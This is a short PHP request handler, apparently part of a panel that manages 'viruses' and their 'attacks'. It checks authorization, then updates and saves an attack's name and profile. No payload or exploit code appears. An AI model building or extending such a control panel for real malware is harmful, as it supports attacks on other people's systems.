<?php

use Kelvinho\Virus\Singleton\Header;

$virus_id = $requestData->postCheck("virus_id");
$attack_id = $requestData->postCheck("attack_id");

$name = $requestData->postCheck("name");
$profile = $requestData->postCheck("profile");

if (!$authenticator->authorized($virus_id, $attack_id)) Header::forbidden();

$attack = $attackFactory->get($attack_id);
$attack->setName($name);
$attack->setProfile($profile);
$attack->saveState();
$attack->includeController();
